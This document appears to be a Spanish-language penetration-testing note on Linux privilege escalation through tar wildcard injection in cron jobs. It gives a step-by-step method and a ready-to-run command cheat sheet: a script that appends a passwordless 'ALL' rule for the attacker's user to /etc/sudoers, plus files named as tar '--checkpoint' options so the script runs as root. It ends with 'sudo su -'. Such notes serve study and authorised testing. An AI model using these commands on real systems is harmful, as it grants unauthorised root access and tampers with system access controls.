---
tags:
  - linux
  - enum
  - privex
---
## Conceptos Clave (TL;DR)

* Un carácter comodín (wildcard) sustituye a otros caracteres y es interpretado por la shell antes de ejecutar otras acciones.
* Los comodines comunes incluyen el asterisco (*) para coincidir con cualquier número de caracteres, y el signo de interrogación (?) para un solo carácter.
* Comandos como `tar` pueden ser abusados para escalada de privilegios cuando utilizan comodines (como `*`) en combinación con la lectura de archivos.
* Si se crean archivos con nombres idénticos a opciones de la línea de comandos, al expandirse el comodín, la shell los pasa como argumentos legítimos al programa, permitiendo la ejecución de comandos del sistema operativo (Arbitrary Command Execution).

## Herramientas Clave

* `tar`: Programa común para crear/extraer archivos comprimidos que cuenta con banderas de ejecución de comandos integradas vulnerables a este ataque.
* `cron` (implícito): Demonio de tareas programadas que, al ejecutar comandos vulnerables de forma automatizada, provee el vector ideal para escalada de privilegios.

## Metodología Paso a Paso

* **Fase 1: Identificación de la vulnerabilidad**
  * Se requiere enumerar el sistema en busca de tareas programadas (cron jobs) que ejecuten el comando `tar` usando un comodín (como  \*) dentro de un directorio donde el atacante tenga permisos de escritura.

* **Fase 2: Preparación del Payload**
  * Se crea un script malicioso en el directorio objetivo que contendrá la acción a ejecutar con privilegios elevados, como modificar el archivo `/etc/sudoers` para permitir acceso administrativo sin contraseña.

* **Fase 3: Inyección de Argumentos**
  * Se crean archivos vacíos en el mismo directorio con nombres que coincidan exactamente con las opciones `--checkpoint=1` y `--checkpoint-action=exec=sh <SCRIPT>` del comando `tar`.
  * La opción `--checkpoint-action` permite ejecutar una acción EXEC cuando se alcanza un checkpoint en el comando `tar`.

* **Fase 4: Ejecución y Elevación**
  * Se espera a que el cron job se ejecute automáticamente; al expandir el comodín `*`, los archivos creados se leerán como argumentos, ejecutando el payload.
  * Se validan los nuevos privilegios adquiridos y se procede con el acceso root.

## Cheat Sheet de Comandos

```bash
# Fase 2: Crear el script con el payload malicioso que modificará los privilegios del usuario.
# Reemplaza <USER> con tu usuario actual comprometido.
echo 'echo "<USER> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# Fase 3: Crear los archivos que serán interpretados como argumentos (flags) por el comando tar.
# Esto indicará a tar que ejecute el script 'root.sh' como una acción de checkpoint.
echo "" > "--checkpoint-action=exec=sh root.sh"

# Este archivo activa los checkpoints en tar, estableciendo el intervalo a 1.
echo "" > --checkpoint=1

# Fase 4: Verificar que los archivos maliciosos se han creado correctamente en el directorio objetivo.
ls -la 

# Fase 4: Una vez que el cron job vulnere el sistema (esperar el tiempo programado), verificar los privilegios de sudo.
sudo -l

# Ejecutar una shell interactiva como root sin requerir contraseña (asumiendo que el payload fue el de sudoers).
sudo su -
```

## "Gotchas" y Troubleshooting

* Este vector de ataque requiere indispensablemente que el atacante pueda crear archivos en el directorio exacto donde el cron job ejecuta el comando `tar` con el comodín.
* El ataque depende del intervalo de tiempo configurado en el cron job; un cron job que se ejecuta cada minuto es el escenario ideal, pero otros pueden requerir esperas más prolongadas (horas o días).
* La bandera `--checkpoint[=N]` de `tar` muestra mensajes de progreso por defecto cada 10 registros, por lo que es necesario establecerlo en 1 mediante `--checkpoint=1` para asegurar la ejecución rápida del payload.
* La opción `--checkpoint-action` permite ejecutar comandos arbitrarios del sistema, pero su sintaxis debe ser exacta (`exec=sh <SCRIPT>`) al momento de nombrar el archivo para que la ejecución funcione.